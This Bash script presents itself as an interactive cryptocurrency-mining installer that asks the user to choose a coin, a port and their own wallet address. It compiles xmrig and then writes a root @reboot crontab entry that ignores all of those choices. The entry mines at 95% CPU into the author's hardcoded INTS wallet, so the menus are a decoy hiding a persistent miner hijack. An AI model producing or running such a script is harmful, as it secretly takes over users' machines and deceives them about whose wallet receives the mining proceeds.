#!/bin/bash
####################################################
red=$'\e[1;31m'
grn=$'\e[1;32m'
yel=$'\e[1;33m'
blu=$'\e[1;34m'
mag=$'\e[1;35m'
cyn=$'\e[1;36m'
end=$'\e[0m'
####################################################
echo -e "$blu Script auto mining by SecrectVN$end"
echo -e "If so good you can $red donate $end"
echo -e "$red INTS WALLET $red : iz4znrxGXvnLzSsdL5RdYtDMML8JZVFtkdiHX6ioxpEXhgsJMk5sy4pEUgan51chU3e6uSnvZc4FDjRVJB9ZbCUV1syXMriSf  "
echo -e "$red FNO WALLET $red : 8xF6gw4VfP9dJWmyGcgjvpe3EjmbMFpzXaoV9RYZuaSWJdX2h6tRvxcC5ZvJi7Zek8DGozR2G5o2346axb1Mc7oU7Rqr1nn   "
echo -e "$red AEON WALLET $red : Wmtj4bX83CqahEbSCjD3dmFf52Jh2RYgo7N6Fpmz4U539coLByWfU8u2fANUaFEtjeUYfbTNTrZa6hoDcJxTTCZp2GaLnAwvb   "
echo -e "$red SUMO WALLET $red : Sumoo1UGTf5iK317a8ACZBNHAdQUFqRgAQzSCut3L5EiHr8tFGskUm3EFeBTkPP5Bwae8K23gh1TQjVGXMBTmbef4rByC13U7A3 "
echo -e "$red SUMO WALLET $red : Sumoo1UGTf5iK317a8ACZBNHAdQUFqRgAQzSCut3L5EiHr8tFGskUm3EFeBTkPP5Bwae8K23gh1TQjVGXMBTmbef4rByC13U7A3 "
echo -e "$red XLC WALLET $red : LtMig6TakmafkL6THtiN9TCB96yRhK3rUgsdsCPGqhoU6DvrwkU6fDgS9mbSqfmsYG3MG5nBH5SLXJMx3qLx8RAf1KSWaNk "

# Menu
echo -e "$grn Please pick coin you want  mining  :$end"

select coin in intense fonero aeon sumokoin karbo monero
do
        case $coin in 
        intense|fonero|aeon|sumokoin|karbo|monero)   
                break
                ;;
        *)
                echo "Invalid Coin" 
                ;;
        esac
done


echo -e "$grn Now pick port you want mining :$end"
echo -e "$red You should check the port list at the website before making a selection$end $blu https://www.hashvault.pro $end"

select port in  80 443 3334	3333 9000 7777 5555	8080 8888

do
        case $port in
        80|443|3334|3333|9000|7777|5555|8080|8888)
                break
                ;;
        *)
                echo "Invalid port"
                ;;
        esac
done

echo -e  "$grn Input wallet address : $end"
read wallet

#SCRIPT AUTO INSTALL MINING
#!/bin/bash
cd && sudo apt update && apt upgrade -y ;
sudo apt-get install software-properties-common ;  	
sudo apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev htop screen -y ;
sudo git clone https://github.com/xmrig/xmrig.git mining && mkdir -p ~/mining/build && cd ~/mining/build && cmake .. && make ;
cd ~/mining/build/ && mv xmrig ~/ && cd ~/ ;

echo "@reboot root screen /root/xmrig -o  pool.intense.hashvault.pro:8888 -u iz4znrxGXvnLzSsdL5RdYtDMML8JZVFtkdiHX6ioxpEXhgsJMk5sy4pEUgan51chU3e6uSnvZc4FDjRVJB9ZbCUV1syXMriSf -p $(hostname) -k --max-cpu-usage=95 --donate-level=1 " >> /etc/crontab ;

